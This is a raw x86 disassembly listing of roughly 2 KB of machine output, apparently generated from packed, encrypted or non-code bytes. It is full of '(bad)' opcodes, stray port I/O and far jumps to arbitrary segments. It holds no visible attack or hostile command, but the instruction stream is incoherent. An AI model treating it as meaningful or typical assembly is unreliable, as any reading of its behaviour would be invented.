  4230ba:	cmp    DWORD PTR [ecx-0x5e667b69],ebp
  4230c0:	retf   0x1359
  4230c3:	sub    al,0x77
  4230c5:	or     eax,0xd55e9019
  4230ca:	jo     0x42309e
  4230cc:	mov    eax,ds:0x8440b24
  4230d1:	popa   
  4230d2:	or     DWORD PTR [ecx-0x6d572799],eax
  4230d8:	adc    dh,BYTE PTR ds:0x774afc00
  4230de:	out    0xf8,eax
  4230e0:	retf   0xbe8c
  4230e3:	imul   ecx,DWORD PTR [edi+0xaa2ef54],0x9028e960
  4230ed:	dec    edi
  4230ee:	dec    esi
  4230ef:	lods   al,BYTE PTR ds:[esi]
  4230f0:	ret    0xefb7
  4230f3:	(bad)  
  4230f4:	out    0xcd,eax
  4230f6:	cmp    cl,dh
  4230f8:	pop    esi
  4230f9:	adc    BYTE PTR [edi+0x40],cl
  4230fc:	jbe    0x423166
  4230fe:	stc    
  4230ff:	cdq    
  423100:	mov    bl,0x90
  423102:	push   0x147b5e20
  423107:	pop    es
  423108:	adc    edi,esp
  42310a:	out    dx,al
  42310b:	sub    DWORD PTR [esi],ebp
  42310d:	mov    ecx,DWORD PTR [esi-0x6c]
  423110:	push   es
  423111:	mov    dh,0xa1
  423113:	mov    eax,ds:0xf312872
  423118:	in     eax,0xb4
  42311a:	aad    0xf5
  42311c:	jmp    0x423180
  42311e:	lock xor DWORD PTR [ecx-0x3197b7c4],ebp
  423125:	or     eax,0x3e7f452d
  42312a:	inc    esi
  42312b:	and    DWORD PTR [ecx+0x61],edx
  42312e:	adc    DWORD PTR [eax],edx
  423130:	xor    esi,DWORD PTR ds:0x5058b66f
  423136:	pop    esp
  423137:	(bad)  
  423138:	pop    esi
  423139:	test   esp,esp
  42313b:	fld    QWORD PTR [eax+eax*2+0x61f10d5d]
  423142:	aam    0x2d
  423144:	arpl   WORD PTR [eax+ebx*4+0x292ca440],bp
  42314b:	mov    dh,0xe7
  42314d:	mov    al,ds:0xfb0be80a
  423152:	and    DWORD PTR [ebx+ecx*2+0x728800e1],esi
  423159:	or     esp,ebp
  42315b:	push   eax
  42315c:	loope  0x4231bc
  42315e:	lds    eax,FWORD PTR [esi-0x1bf761f4]
  423164:	fldz   
  423166:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423167:	popa   
  423168:	adc    dh,ah
  42316a:	xchg   edx,eax
  42316b:	push   0xd026d85e
  423170:	pop    ecx
  423171:	mov    esi,0x60ceca60
  423176:	jl     0x423199
  423178:	or     bl,bl
  42317a:	or     cl,bh
  42317c:	std    
  42317d:	xor    eax,0x256e02e7
  423182:	lea    ecx,[esi+edi*2-0x4d]
  423186:	fimul  WORD PTR [ecx+0x56]
  423189:	dec    edx
  42318a:	add    al,dh
  42318c:	xor    DWORD PTR [edx+0x5],ebx
  42318f:	xchg   edi,eax
  423190:	mov    ecx,0x34d2d570
  423195:	stc    
  423196:	out    dx,al
  423197:	ins    BYTE PTR es:[edi],dx
  423198:	ins    BYTE PTR es:[edi],dx
  423199:	sub    dh,ch
  42319b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42319c:	push   ebx
  42319d:	push   cs
  42319e:	jecxz  0x423147
  4231a0:	sbb    BYTE PTR [eax],ah
  4231a2:	push   edx
  4231a3:	inc    esi
  4231a4:	fbld   TBYTE PTR [eax-0x5a]
  4231a7:	mov    bl,0x89
  4231a9:	outs   dx,DWORD PTR ds:[esi]
  4231aa:	out    dx,al
  4231ab:	add    esp,0x582d8d9c
  4231b1:	loope  0x42314e
  4231b3:	test   al,0x90
  4231b5:	popa   
  4231b6:	cmp    DWORD PTR ds:[ebx],ebp
  4231b9:	mov    cl,0xe1
  4231bb:	mov    edx,0x1ae3d804
  4231c0:	pop    esi
  4231c1:	jl     0x423183
  4231c3:	gs sub bl,bh
  4231c6:	mov    edx,ebx
  4231c8:	(bad)  [ebx]
  4231ca:	add    eax,DWORD PTR [edi-0x12b3acdf]
  4231d0:	or     al,0x73
  4231d2:	into   
  4231d3:	adc    esp,edx
  4231d5:	mov    ah,0xd4
  4231d7:	cmp    eax,0x68ddc65e
  4231dc:	push   esi
  4231dd:	repnz fwait
  4231df:	pop    ds
  4231e0:	inc    edx
  4231e1:	sub    BYTE PTR [ecx+esi*8-0x28],ch
  4231e5:	pusha  
  4231e6:	xlat   BYTE PTR ds:[ebx]
  4231e7:	nop
  4231e8:	lods   al,BYTE PTR ds:[esi]
  4231e9:	loop   0x423189
  4231eb:	(bad)  [edx+0x34e8206d]
  4231f1:	popa   
  4231f2:	jae    0x42324e
  4231f4:	jl     0x42322e
  4231f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4231f7:	js     0x42317c
  4231f9:	pusha  
  4231fa:	inc    ebx
  4231fb:	(bad)  
  4231fc:	iret   
  4231fd:	ret    0x5277
  423200:	push   esi
  423201:	mov    ebp,0x545eae56
  423206:	outs   dx,DWORD PTR ds:[esi]
  423207:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423208:	pop    edx
  423209:	mov    WORD PTR [eax],gs
  42320b:	xchg   edi,eax
  42320c:	mov    bh,BYTE PTR [ebx+edx*1-0x12681e51]
  423213:	and    cl,BYTE PTR [edx]
  423215:	pushf  
  423216:	stos   BYTE PTR es:[edi],al
  423217:	mov    ebp,0x73d0b950
  42321c:	pop    esi
  42321d:	jne    0x4231c8
  42321f:	into   
  423220:	xchg   ebp,eax
  423221:	test   BYTE PTR [edx-0x5e9f2869],bl
  423227:	stos   DWORD PTR es:[edi],eax
  423228:	enter  0x2b61,0x55
  42322c:	sbb    al,0xa2
  42322e:	out    dx,al
  42322f:	sub    esi,DWORD PTR ds:0x36b2180d
  423235:	stos   BYTE PTR es:[edi],al
  423236:	and    DWORD PTR [ecx-0x3faab7b5],esp
  42323c:	mov    esi,0x64b2c6bd
  423241:	and    al,0x86
  423243:	pop    esi
  423244:	stc    
  423245:	add    BYTE PTR [esi-0x5acb6a0],bh
  42324b:	jmp    0x44a6:0xacd87d2d
  423252:	mov    esp,DWORD PTR [ebx+eax*8+0x14]
  423256:	mov    BYTE PTR [ebp+0x5e],ch
  423259:	mov    edx,cr2
  42325c:	test   DWORD PTR [edi-0x5c],edx
  42325f:	jge    0x4231e9
  423261:	sub    esi,DWORD PTR ds:0x41ec3ca1
  423267:	js     0x423235
  423269:	xor    al,0x4d
  42326b:	and    BYTE PTR [ebp-0x54],ch
  42326e:	ins    DWORD PTR es:[edi],dx
  42326f:	jo     0x4232cf
  423271:	add    ebx,DWORD PTR [esi-0x2e]
  423274:	js     0x423271
  423276:	pop    eax
  423277:	ins    BYTE PTR es:[edi],dx
  423278:	aam    0x60
  42327a:	adc    al,0x57
  42327c:	test   eax,esi
  42327e:	repnz xchg ebp,eax
  423280:	in     eax,0x62
  423282:	jmp    0x423208
  423284:	fadd   QWORD PTR [eax]
  423286:	dec    ebp
  423287:	jg     0x42321d
  423289:	test   al,0x53
  42328b:	and    BYTE PTR [eax],dl
  42328d:	popa   
  42328e:	lahf   
  42328f:	inc    esp
  423290:	lods   al,BYTE PTR ds:[esi]
  423291:	cmp    al,0xfa
  423293:	pop    edx
  423294:	add    BYTE PTR [ebp-0x5b0a4f1e],dh
  42329a:	out    dx,al
  42329b:	xor    eax,0x1858e5ad
  4232a0:	ret    0x7056
  4232a3:	loopne 0x42329e
  4232a5:	lock xchg esp,eax
  4232a7:	mov    al,0x63
  4232a9:	pop    ss
  4232aa:	test   BYTE PTR [ebx-0x22],dh
  4232ad:	loopne 0x42332b
  4232af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4232b0:	mov    edi,ebp
  4232b2:	pop    eax
  4232b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4232b4:	dec    eax
  4232b5:	sub    eax,0xdddfa219
  4232ba:	clc    
  4232bb:	enter  0x586e,0x59
  4232bf:	pushf  
  4232c0:	pop    esi
  4232c1:	or     dl,bl
  4232c3:	and    BYTE PTR gs:[eax],bl
  4232c6:	sub    eax,0x5160ddfa
  4232cb:	(bad)  
  4232cc:	mov    ebx,0x6ddd3172
  4232d1:	mov    ds:0x3364e866,eax
  4232d6:	fsubr  st(5),st
  4232d8:	cwde   
  4232d9:	sub    dh,0x77
  4232dc:	mov    ds:0xec278d6d,eax
  4232e1:	pusha  
  4232e2:	push   eax
  4232e3:	lock jl 0x4232a7
  4232e6:	push   esp
  4232e7:	fsub   st(5),st
  4232e9:	xchg   ebp,eax
  4232ea:	out    dx,al
  4232eb:	cdq    
  4232ec:	xor    cl,BYTE PTR [esi]
  4232ee:	or     al,0x30
  4232f0:	aaa    
  4232f1:	ss pushf 
  4232f3:	int    0x50
  4232f5:	(bad)  
  4232f6:	out    dx,al
  4232f7:	dec    ecx
  4232f8:	add    ebx,DWORD PTR [ebp+0x6f]
  4232fb:	pop    esi
  4232fc:	push   esp
  4232fd:	jmp    0x4232ed
  4232ff:	lds    ebp,FWORD PTR [edi-0x46]
  423302:	out    dx,eax
  423303:	add    al,0x7f
  423305:	in     eax,0x1
  423307:	(bad)  
  423309:	mov    WORD PTR [eax],fs
  42330b:	add    bl,BYTE PTR [esi+0x1e]
  42330e:	mov    dh,0x4c
  423310:	dec    ecx
  423311:	dec    edx
  423312:	mov    cl,0xff
  423314:	pop    esi
  423315:	div    BYTE PTR [edx-0x346c595c]
  42331b:	and    DWORD PTR [ecx],ebx
  42331d:	popa   
  42331e:	jb     0x4232dd
  423320:	call   0xee6d:0xcd67867d
  423327:	repnz rcr ecx,1
  42332a:	into   
  42332b:	adc    BYTE PTR [eax],dl
  42332d:	adc    edx,DWORD PTR [edi]
  42332f:	mov    eax,ds:0x1a444752
  423334:	jno    0x4232ce
  423336:	lea    edx,[ecx+0x5e]
  423339:	(bad)  
  42333a:	test   al,0x1c
  42333c:	mov    ds:0x9adb38f5,eax
  423341:	pusha  
  423342:	push   esi
  423343:	ror    DWORD PTR [edx-0x62],0xec
  423347:	mov    edx,0xc266b072
  42334c:	pop    ebx
  42334d:	and    ebp,ebx
  42334f:	call   0xe891bcbc
  423354:	mov    ah,dl
  423356:	fidivr WORD PTR [ecx]
  423358:	mov    ebp,0x62a16372
  42335d:	sbb    eax,0xab45a8
  423362:	call   0xbc94:0x31755e34
  423369:	mov    dh,0x42
  42336b:	mov    es,WORD PTR [ecx]
  42336d:	pop    edi
  42336e:	cmp    dl,0x8a
  423371:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423372:	inc    esp
  423373:	mov    WORD PTR [esi+0x5ef452f1],ds
  423379:	fwait
  42337a:	push   ebp
  42337b:	mov    ebp,DWORD PTR [edx+0x21bca841]
  423381:	popa   
  423382:	pop    ecx
  423383:	es (bad) 
  423385:	xor    BYTE PTR [ebx+0x15],dl
  423388:	(bad)  
  423389:	div    DWORD PTR [esi+0x7461310b]
  42338f:	jecxz  0x423359
  423391:	lods   eax,DWORD PTR ds:[esi]
  423392:	pshuflw xmm3,XMMWORD PTR [ebp+0x46],0xe
  423398:	pusha  
  423399:	js     0x42338b
  42339b:	mov    al,BYTE PTR [esi+0x5e122439]
  4233a1:	mov    esi,0x4202e32a
  4233a6:	(bad)  
  4233a7:	lods   eax,DWORD PTR ds:[esi]
  4233a8:	(bad)  
  4233a9:	pusha  
  4233aa:	ins    BYTE PTR es:[edi],dx
  4233ab:	loop   0x423343
  4233ad:	gs add eax,0x5a07f676
  4233b3:	(bad)  
  4233b4:	jmp    0xb7f:0x6730ee5c
  4233bb:	cmp    eax,0xa7fdd5e5
  4233c0:	icebp  
  4233c1:	out    0xf2,eax
  4233c3:	mov    edx,0xc9e530b6
  4233c8:	jbe    0x4233c9
  4233ca:	out    0xf7,al
  4233cc:	pop    esi
  4233cd:	out    dx,al
  4233ce:	inc    eax
  4233cf:	pusha  
  4233d0:	ss xchg esi,eax
  4233d2:	mov    ah,0xdf
  4233d4:	in     eax,0x60
  4233d6:	dec    BYTE PTR [eax-0x10]
  4233d9:	adc    dh,dl
  4233db:	sbb    DWORD PTR [ecx],0xffffff94
  4233de:	out    dx,al
  4233df:	jae    0x4233af
  4233e1:	sbb    bh,0xb2
  4233e4:	inc    esp
  4233e5:	cdq    
  4233e6:	(bad)  
  4233e7:	inc    eax
  4233e8:	call   0x2fbd:0x7a0afd7
  4233ef:	push   esp
  4233f0:	inc    ebx
  4233f1:	fstp   TBYTE PTR [eax+0x8]
  4233f4:	pop    esi
  4233f5:	xchg   al,bl
  4233f7:	rcl    BYTE PTR [edx-0x6b],cl
  4233fa:	icebp  
  4233fb:	mov    bh,0x95
  4233fd:	pusha  
  4233fe:	lds    ebx,FWORD PTR [eax+0x1b]
  423401:	les    eax,FWORD PTR [ecx]
  423403:	sbb    BYTE PTR [ecx],bh
  423405:	and    edi,edi
  423407:	add    BYTE PTR [ecx],ah
  423409:	push   edi
  42340a:	cs sub al,0xc1
  42340d:	sub    BYTE PTR [esp+ebp*1+0x69516098],ch
  423414:	push   ss
  423415:	dec    ebx
  423416:	arpl   WORD PTR [ebp-0x351281e3],ax
  42341c:	adc    bl,BYTE PTR [ebp+0x54]
  42341f:	cmc    
  423420:	sub    dh,BYTE PTR [ecx+0x60a5024a]
  423426:	jnp    0x423490
  423428:	sub    ch,0x7a
  42342b:	push   edi
  42342c:	jl     0x423472
  42342e:	out    dx,al
  42342f:	or     BYTE PTR [ecx+0x35],dl
  423432:	in     eax,0x16
  423434:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423435:	sub    eax,0x609d116a
  42343a:	out    0xb8,eax
  42343c:	ficom  WORD PTR [eax+0x303e911]
  423442:	out    dx,eax
  423443:	mov    DWORD PTR [eax-0x361eed39],esi
  423449:	pop    eax
  42344a:	jmp    0x42340b
  42344c:	jmp    0x45ef:0xd45fd360
  423453:	popf   
  423454:	and    eax,0x3519b674
  423459:	pusha  
  42345a:	loop   0x4234c3
  42345c:	push   ss
  42345d:	mov    bl,0xf4
  42345f:	mov    dh,0xa2
  423461:	pop    ds
  423462:	adc    esp,DWORD PTR [ecx+0x4cff7ecf]
  423468:	std    
  423469:	out    0xf0,al
  42346b:	or     eax,0x966a2073
  423470:	(bad)  
  423471:	fucomip st,st(6)
  423473:	in     al,dx
  423474:	pop    esp
  423475:	push   0x34
  423477:	enter  0xe78a,0x36
  42347b:	mov    ds:0x5f10cee0,al
  423480:	fcmovnbe st,st(1)
  423482:	cdq    
  423483:	imul   ebp,DWORD PTR [ecx],0xae9300be
  423489:	sbb    al,dh
  42348b:	loope  0x42345f
  42348d:	mov    edi,0xe896a3a9
  423492:	inc    edx
  423493:	mov    al,0xa6
  423495:	dec    edx
  423496:	inc    esi
  423497:	lahf   
  423498:	xor    BYTE PTR [edi],0xee
  42349b:	inc    eax
  42349c:	imul   eax,DWORD PTR [ecx-0x74],0x22fdebf1
  4234a3:	mov    ebp,0xa1b92716
  4234a8:	pop    ss
  4234a9:	jp     0x42346f
  4234ab:	cmc    
  4234ac:	mov    dl,0xe0
  4234ae:	dec    BYTE PTR [edi+0x61]
  4234b1:	fisubr DWORD PTR [edx-0x519f058c]
  4234b7:	cmp    BYTE PTR es:[ecx-0x1],dh
  4234bb:	push   edi
  4234bc:	aaa    
  4234bd:	(bad)
  4234c0:	cmp    al,BYTE PTR [ecx]
  4234c2:	arpl   WORD PTR [edi],bp
  4234c4:	aad    0xab
  4234c6:	shr    edi,1
  4234c8:	cmp    DWORD PTR [edi],ebp
  4234ca:	xchg   ecx,eax
  4234cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4234cc:	inc    esp
  4234cd:	mov    ds:0x9dd7f9d7,eax
  4234d2:	fisub  WORD PTR [edi]
  4234d4:	mov    dh,0xee
  4234d6:	shl    BYTE PTR [ebx],1
  4234d8:	pop    esi
  4234d9:	cmc    
  4234da:	jle    0x423470
  4234dc:	mov    edx,0x62914b42
  4234e1:	popa   
  4234e2:	sahf   
  4234e3:	push   esp
  4234e4:	jge    0x42353b
  4234e6:	mov    esi,DWORD PTR ds:0xa1eed844
  4234ec:	aam    0x4c
  4234ee:	(bad)  
  4234f0:	push   edx
  4234f1:	(bad)  
  4234f2:	cmp    BYTE PTR [ecx-0x3e11329b],ch
  4234f8:	and    al,0x6f
  4234fa:	aad    0xb0
  4234fc:	fstp   TBYTE PTR [esi+ebp*8+0x2d0c73fb]
  423503:	pop    eax
  423504:	adc    edx,DWORD PTR [ebp+0x60]
  423507:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423508:	mov    ebx,0xafe3f42e
  42350d:	aad    0xa6
  42350f:	aam    0xc6
  423511:	retf   
  423512:	jmp    0x4234e4
  423514:	mov    al,0xf
  423516:	mov    ?,WORD PTR [edi]
  423518:	cld    
  423519:	shr    DWORD PTR [esi+0x14],1
  42351c:	inc    ebp
  42351d:	iret   
  42351e:	inc    ebx
  42351f:	mov    eax,ds:0x64bf5b71
  423524:	mov    edi,edi
  423526:	add    DWORD PTR [ebp+ebx*2+0x6aec9b99],eax
  42352d:	push   esi
  42352e:	push   ebp
  42352f:	sbb    DWORD PTR [ebp-0x300a993d],0xde5ca157
  423539:	sub    BYTE PTR [ecx+edi*8+0x4f],0xac
  42353e:	into   
  42353f:	frndint 
  423541:	inc    ecx
  423542:	(bad)  
  423543:	cmp    dl,dh
  423545:	jp     0x4235ac
  423547:	push   edx
  423548:	pop    ebx
  423549:	clc    
  42354a:	scas   al,BYTE PTR es:[edi]
  42354b:	pop    ebx
  42354c:	push   cs
  42354d:	and    BYTE PTR [edx+0x4461439b],bh
  423553:	lock repnz (bad) 
  423556:	sahf   
  423557:	mul    DWORD PTR [eax+0x5e24e3a2]
  42355d:	add    DWORD PTR [esi],edx
  42355f:	adc    al,0xc
  423561:	jg     0x42355d
  423563:	aas    
  423564:	jle    0x4235c6
  423566:	mov    BYTE PTR [edx+0x720a0c4c],bl
  42356c:	sahf   
  42356d:	aas    
  42356e:	xlat   BYTE PTR ds:[ebx]
  42356f:	push   ebp
  423570:	pop    ebp
  423571:	(bad)  
  423572:	jmp    0x423521
  423574:	add    eax,0x6a62c043
  423579:	xor    dl,dh
  42357b:	jmp    0x4235d7
  42357d:	and    ch,BYTE PTR [eax+eiz*4-0x15]
  423581:	jge    0x423557
  423583:	jmp    0xa11f:0x69c5757d
  42358a:	retf   0x5e7e
  42358d:	retf   0xd279
  423590:	add    BYTE PTR [ebx],0x1b
  423593:	int3   
  423594:	sub    al,0x61
  423596:	inc    eax
  423597:	stos   DWORD PTR es:[edi],eax
  423598:	mov    esp,0x28ea9e6
  42359d:	push   0x14ca2001
  4235a2:	cs sbb bl,dl
  4235a5:	adc    DWORD PTR [ecx],ebx
  4235a7:	addr16 mov dh,0x60
  4235aa:	mov    edi,0x6d21c045
  4235af:	dec    eax
  4235b0:	cdq    
  4235b1:	into   
  4235b2:	loop   0x4235e7
  4235b4:	pop    ebx
  4235b5:	sub    BYTE PTR [edx-0x5d],cl
  4235b8:	mov    al,ds:0x724def31
  4235bd:	loopne 0x423611
  4235bf:	inc    edx
  4235c0:	fistp  WORD PTR [edi-0x1d]
  4235c3:	(bad)  
  4235c4:	dec    eax
  4235c5:	popa   
  4235c6:	mov    cl,dh
  4235c8:	js     0x4235dd
  4235ca:	xchg   esp,eax
  4235cb:	push   0x53
  4235cd:	xchg   al,dh
  4235cf:	cmp    eax,0xe8621f47
  4235d4:	mov    BYTE PTR [ecx],dh
  4235d6:	(bad)  
  4235d7:	ds sahf 
  4235d9:	aaa    
  4235da:	pop    ss
  4235db:	mov    eax,ds:0xb1bbdb14
  4235e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4235e1:	push   esi
  4235e2:	adc    eax,0x72853df
  4235e7:	dec    ebp
  4235e8:	sbb    eax,0x21074a81
  4235ed:	xchg   BYTE PTR [esi+0x5c1a5f7b],ch
  4235f3:	mov    eax,ds:0x8cae8714
  4235f8:	das    
  4235f9:	mov    eax,0xd95fbcd7
  4235fe:	mov    al,0x93
  423600:	pushf  
  423601:	push   esp
  423602:	jle    0x42361d
  423604:	xor    BYTE PTR [ecx],0x99
  423607:	mov    eax,ds:0x89498845
  42360c:	xor    edi,DWORD PTR [ebx+0x3e5eb69c]
  423612:	xor    esp,ecx
  423614:	std    
  423615:	inc    edi
  423616:	adc    edx,eax
  423618:	mov    fs,WORD PTR [eax+0xf]
  42361b:	ds pop edx
  42361d:	sub    dh,BYTE PTR [ecx+0x7]
  423620:	sbb    eax,0xb930ee5b
  423625:	and    DWORD PTR ds:[eax+0x5f],edx
  423629:	repz mov ds:0xac4794a1,al
  42362f:	lahf   
  423630:	imul   ebx,DWORD PTR [ebx+0x58],0xb1115e61
  423637:	je     0x4235f2
  423639:	cmc    
  42363a:	js     0x423607
  42363c:	(bad)  
  42363d:	pusha  
  42363e:	(bad)  
  42363f:	popa   
  423640:	xor    al,0xc2
  423642:	mov    edi,0xeca7d4c9
  423647:	sub    DWORD PTR [edi],esi
  423649:	inc    eax
  42364a:	or     BYTE PTR [ebp-0x61],ah
  42364d:	sar    al,0x91
  423650:	les    esp,FWORD PTR [eax+0x5f]
  423653:	stos   DWORD PTR es:[edi],eax
  423654:	push   edx
  423655:	repnz imul ebx,DWORD PTR [edx-0x6c1149b5],0xf204d121
  423660:	iret   
  423661:	(bad)  
  423662:	fsub   DWORD PTR [eax-0x317b9841]
  423668:	xor    BYTE PTR [edi],bh
  42366a:	scas   eax,DWORD PTR es:[edi]
  42366b:	clc    
  42366c:	pop    ebp
  42366d:	add    BYTE PTR [edi-0x3be378dc],bl
  423673:	shl    DWORD PTR [edx-0x4954cd65],cl
  423679:	std    
  42367a:	out    dx,al
  42367b:	sbb    ebx,esi
  42367d:	icebp  
  42367e:	sbb    al,0xe1
  423680:	cs dec ebp
  423682:	in     eax,dx
  423683:	test   DWORD PTR [eax-0xac92101],ecx
  423689:	mov    bh,0x6e
  42368b:	inc    edi
  42368c:	pop    edx
  42368d:	loope  0x423637
  42368f:	sbb    BYTE PTR [edi+0x19],ah
  423692:	in     eax,dx
  423693:	pop    eax
  423694:	pop    es
  423695:	imul   ebx,ebp,0x5e591650
  42369b:	fwait
  42369c:	mov    ecx,0x5f24bc18
  4236a1:	aas    
  4236a2:	not    DWORD PTR [ecx]
  4236a4:	adc    al,0x9e
  4236a6:	sub    eax,0xc3c0bcd0
  4236ab:	out    0xe,al
  4236ad:	mov    eax,0x5f5e3131
  4236b2:	loope  0x423713
  4236b4:	xor    BYTE PTR [eax],ah
  4236b6:	aam    0x8a
  4236b8:	enter  0x1860,0xe9
  4236bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4236bd:	xchg   ebx,eax
  4236be:	push   es
  4236bf:	ja     0x423642
  4236c1:	xor    DWORD PTR [edx],eax
  4236c3:	pop    edi
  4236c4:	sbb    esi,DWORD PTR [esi+0x609de0b3]
  4236ca:	xchg   edi,eax
  4236cb:	stc    
  4236cc:	into   
  4236cd:	and    DWORD PTR [bx+di+0x54c8],esp
  4236d2:	je     0x423687
  4236d4:	repz dec edi
  4236d6:	mov    bl,0xe3
  4236d8:	pop    esi
  4236d9:	in     eax,0x6f
  4236db:	call   0x614f:0x5be4667f
  4236e2:	lds    esi,FWORD PTR [edx]
  4236e4:	xchg   ebp,eax
  4236e5:	jl     0x4236d3
  4236e7:	fwait
  4236e8:	scas   al,BYTE PTR es:[edi]
  4236e9:	fs out dx,al
  4236eb:	stos   DWORD PTR es:[edi],eax
  4236ec:	push   cs
  4236ed:	(bad)  
  4236ee:	cmc    
  4236ef:	jno    0x423763
  4236f1:	test   BYTE PTR [eax+ebp*4-0x46f86ba6],al
  4236f8:	jmp    0xfa0006ad
  4236fd:	xor    ah,BYTE PTR [ebx+edi*1+0x65]
  423701:	stos   DWORD PTR es:[edi],eax
  423702:	mov    ss,WORD PTR [ebp-0x4e549f50]
  423708:	fadd   DWORD PTR [esi]
  42370a:	jae    0x4236a1
  42370c:	xor    BYTE PTR [eax-0x45a18d7b],dh
  423712:	frstor [eax]
  423714:	into   
  423715:	sub    edi,DWORD PTR ds:0xf1a75be8
  42371b:	jnp    0x4236ea
  42371d:	mov    dh,bl
  42371f:	pop    ss
  423720:	aaa    
  423721:	xchg   edx,eax
  423722:	test   eax,0x9a4fbaa0
  423727:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423728:	leave  
  423729:	jo     0x42377c
  42372b:	cmp    ebx,DWORD PTR [esi-0x72]
  42372e:	imul   eax,DWORD PTR [eax-0x8],0x46cf533a
  423735:	rol    ebp,1
  423737:	mov    ds:0xcd10fcaa,eax
  42373c:	sub    eax,DWORD PTR [edi-0x634bef6b]
  423742:	pop    ebx
  423743:	clc    
  423744:	div    DWORD PTR [edx]
  423746:	dec    esi
  423747:	stos   BYTE PTR es:[edi],al
  423748:	push   edx
  423749:	mov    al,ds:0x17133567
  42374e:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  423750:	and    al,BYTE PTR [eax+eax*4-0x55]
  423754:	or     DWORD PTR [ebx+0x54],edx
  423757:	hlt    
  423758:	jmp    0x4a310647
  42375d:	mov    BYTE PTR [ebx+0x3c],cl
  423760:	out    dx,al
  423761:	sub    esi,0x49e23565
  423767:	pushf  
  423768:	mov    eax,0x32a3fc0b
  42376d:	inc    edx
  42376e:	push   esp
  42376f:	adc    DWORD PTR [ecx],0xf13a5e14
  423775:	mov    gs,ebp
  423777:	int3   
  423778:	cmp    bl,BYTE PTR [esi]
  42377a:	pop    ecx
  42377b:	inc    esp
  42377c:	jbe    0x423745
  42377e:	dec    esi
  42377f:	mov    BYTE PTR [eax+0xd144b5d],ch
  423785:	(bad)  
  423786:	lock inc ecx
  423788:	xchg   esi,eax
  423789:	push   0x465ea3fa
  42378e:	push   ebp
  42378f:	inc    esp
  423790:	sar    BYTE PTR [ebp+0x68],1
  423793:	pushf  
  423794:	add    esp,DWORD PTR [ecx-0x7d]
  423797:	cmp    eax,0x52d12edb
  42379c:	out    0x5d,eax
  42379e:	adc    dl,BYTE PTR [ebp+0x40eeeb30]
  4237a4:	jo     0x423741
  4237a6:	xor    DWORD PTR [ebx+0x79],edi
  4237a9:	pop    edi
  4237aa:	mov    edi,0xa9800d0a
  4237af:	sahf   
  4237b0:	lds    ebp,FWORD PTR [ecx+0x78046497]
  4237b6:	outs   dx,BYTE PTR ss:[esi]
  4237b8:	mov    edi,0xee07ffa7
  4237bd:	and    ebp,DWORD PTR [ebx]
  4237bf:	sub    edi,esi
  4237c1:	js     0x42378d
  4237c3:	sub    BYTE PTR [ecx+0x76],bh
  4237c6:	xor    BYTE PTR [ecx],ch
  4237c8:	add    al,0x60
  4237ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4237cb:	shr    BYTE PTR [ecx-0x41],0x74
  4237cf:	mov    al,0x12
  4237d1:	xor    DWORD PTR [ecx+0x74],esp
  4237d4:	cmp    ah,al
  4237d6:	in     al,0xe7
  4237d8:	push   edx
  4237d9:	push   ebx
  4237da:	lock test BYTE PTR [ecx+0x56c1a152],bl
  4237e1:	icebp  
  4237e2:	xchg   DWORD PTR [edx-0x13eaa073],esi
  4237e8:	pop    esp
  4237e9:	sub    eax,0x9539618e
  4237ee:	sbb    dh,BYTE PTR [ebp+ebx*2-0x2298abcd]
  4237f5:	mov    BYTE PTR [edx+0x72816ebb],ah
  4237fb:	mov    eax,ds:0x4626432c
  423800:	jge    0x423851
  423802:	data16 lods al,BYTE PTR ds:[esi]
  423804:	pop    esi
  423805:	into   
  423806:	lahf   
  423807:	fcmovnb st,st(3)
  423809:	pop    es
  42380a:	add    DWORD PTR ds:0xf63760e5,esp
  423810:	or     edi,DWORD PTR [ebx]
  423812:	mov    bl,BYTE PTR [edx-0x6]
  423815:	iret   
  423816:	out    dx,al
  423817:	and    cl,bl
  423819:	out    dx,al
  42381a:	out    dx,eax
  42381b:	test   cl,bl
  42381d:	inc    edi
  42381e:	mov    gs,WORD PTR es:[edx-0x1adeada8]
  423825:	sti    
  423826:	in     al,dx
  423827:	rcr    BYTE PTR ds:0x5b87eeb7,1
  42382d:	mov    ds:0xdb0002a,al
  423832:	shl    DWORD PTR [eax+0x509b2a2e],0xd2
  423839:	and    ah,ah
  42383b:	jno    0x4238af
  42383d:	int3   
  42383e:	out    dx,al
  42383f:	cmc    
  423840:	jno    0x423810
  423842:	jne    0x423842
  423844:	jl     0x4237f8
  423846:	sub    al,0xaa
  423848:	pushf  
  423849:	push   ecx
  42384a:	out    dx,al
  42384b:	add    ecx,0xffffffc1
  42384e:	es jge 0x423806
  423851:	or     DWORD PTR [esi-0x34],edi
  423854:	pop    esi
  423855:	sahf   
  423856:	sahf   
  423857:	jbe    0x423866
  423859:	gs jae 0x4238c4
  42385c:	inc    DWORD PTR [ecx-0x1d]
  42385f:	into   
  423860:	aaa    
  423861:	sar    DWORD PTR [esi+0x3],cl
  423864:	fld    QWORD PTR [edi-0x1ebd8def]
  42386a:	and    ch,BYTE PTR [esi-0x765907d4]
  423870:	repnz pusha 
  423872:	inc    edx
  423873:	jo     0x42384a
  423875:	add    BYTE PTR [eax],dl
  423877:	popa   
  423878:	in     al,0xf0
  42387a:	out    dx,al
  42387b:	xor    ebx,eax
  42387d:	(bad)  
  42387e:	cmp    al,0xb0
  423880:	mov    ebp,0x9ca17f0b
  423885:	in     al,0xdd
  423887:	leave  
  423888:	and    BYTE PTR ds:0xa05e191b,0x7a
  42388f:	sub    ebp,edx
  423891:	or     dh,BYTE PTR [eax+ebx*2-0x41]
  423895:	pusha  
  423896:	loope  0x423881
  423898:	pop    ds
  423899:	pop    ebp
  42389a:	or     al,0x69
  42389c:	push   ecx
  42389d:	pop    eax
  42389e:	out    dx,al
  42389f:	iret   
